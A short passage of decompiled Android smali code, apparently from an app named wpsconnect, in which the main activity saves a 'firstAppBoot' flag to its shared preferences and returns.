    invoke-virtual {p0, v2}, Lcom/ngb/wpsconnect/MainActivity;->getPreferences(I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "firstAppBoot"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_0
    return-void
.end method
